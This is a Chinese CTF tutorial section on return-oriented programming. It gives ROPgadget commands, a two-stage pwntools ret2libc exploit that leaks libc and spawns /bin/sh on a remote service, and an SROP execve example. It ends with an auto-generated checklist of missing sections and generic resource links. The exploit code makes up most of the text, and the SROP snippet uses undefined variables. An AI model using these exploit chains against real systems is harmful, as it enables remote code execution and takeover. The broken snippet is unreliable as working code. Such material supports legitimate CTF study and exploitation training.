# ROP利用

### 3.1 ROPgadget使用

```bash
# 查找所有gadget
ROPgadget --binary ./pwn

# 查找特定gadget
ROPgadget --binary ./pwn | grep "pop rdi"

# 查找pop rdi; ret（设置第一个参数）
ROPgadget --binary ./pwn | grep "pop rdi ; ret"

# 查找ret（用于栈对齐）
ROPgadget --binary ./pwn | grep ": ret$"

# 查找syscall
ROPgadget --binary ./pwn | grep "syscall"

# 查找int 0x80（32位系统调用）
ROPgadget --binary ./pwn | grep "int 0x80"
```

```python
from pwn import *

# 使用pwntools的ROP模块
elf = ELF('./binary')
rop = ROP(elf)

# 自动查找gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# 自动构造ROP链
rop.raw(ret)                    # 栈对齐
rop.call(elf.symbols['puts'], [elf.got['puts']])  # 泄露puts地址
rop.call(elf.symbols['main'])   # 返回main

# 获取构造好的ROP链
payload = rop.chain()
print(payload)
```

### 3.2 多段ROP链

```python
from pwn import *

context(arch='amd64', os='linux')

# 多段ROP: 泄露libc → 返回main → 第二次溢出getshell

p = remote('ctf.example.com', 9999)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# === 第一段ROP: 泄露libc基址 ===
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

rop.raw(ret)                           # 栈对齐
rop.raw(pop_rdi)
rop.raw(elf.got['puts'])               # 参数: puts的GOT地址
rop.raw(elf.plt['puts'])               # 调用puts
rop.raw(elf.symbols['main'])           # 返回main

offset = 0x40 + 8
payload1 = b'A' * offset + rop.chain()

p.sendline(payload1)

# 接收泄露的地址
leaked = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']
print(f"[+] libc基址: {hex(libc_base)}")

# === 第二段ROP: 调用system("/bin/sh") ===
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

rop2 = ROP(elf)
rop2.raw(ret)          # 栈对齐
rop2.raw(pop_rdi)
rop2.raw(binsh_addr)
rop2.raw(system_addr)

payload2 = b'A' * offset + rop2.chain()

p.sendline(payload2)
p.interactive()
```

### 3.3 SROP（Sigreturn Oriented Programming）

```python
from pwn import *

context(arch='amd64', os='linux')

# SROP原理:
# 利用sigreturn系统调用恢复信号上下文
# 可以一次性设置所有寄存器

# 需要的条件:
# 1. 能触发sigreturn（syscall 15）
# 2. 能控制栈上的Sigreturn Frame

# 构造Sigreturn Frame
frame = SigreturnFrame()
frame.rax = 59          # execve系统调用号
frame.rdi = binsh_addr  # 参数1: /bin/sh地址
frame.rsi = 0           # 参数2: NULL
frame.rdx = 0           # 参数3: NULL
frame.rsp = stack_addr   # 栈指针
frame.rip = syscall_addr # 指向syscall; ret

# 利用链:
# 1. 设置rax=15（sigreturn系统调用号）
# 2. 调用syscall
# 3. 栈上的frame被恢复到寄存器
# 4. 按照frame中的值继续执行

# 完整示例
# 假设有一个read函数可以读取大量数据到栈上
read_addr = 0x401234   # read函数地址
syscall_addr = 0x401250 # syscall; ret地址
binsh_addr = 0x404050   # /bin/sh字符串地址

# 通过read的返回值设置rax
# read(0, buf, size) → 如果读入15字节，rax=15
# 15恰好是sigreturn的系统调用号!

# 构造Frame
frame = SigreturnFrame()
frame.rax = 59           # execve
frame.rdi = binsh_addr   # /bin/sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

# Payload:
# 1. 填充 + read地址（读入15字节）
# 2. 返回到 syscall_addr
# 3. SigreturnFrame

payload = b'A' * offset
payload += p64(read_addr)    # 调用read
payload += p64(syscall_addr) # 然后执行syscall
payload += bytes(frame)       # Frame数据

# 发送15字节数据触发sigreturn
# read会返回读取的字节数=15，rax=15
# 然后syscall执行sigreturn
p.sendline(payload)
p.send(b'A' * 15)  # 精确15字节
p.interactive()
```

---

---

## 📋 内容审核与补充建议

> 针对「ROP利用」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
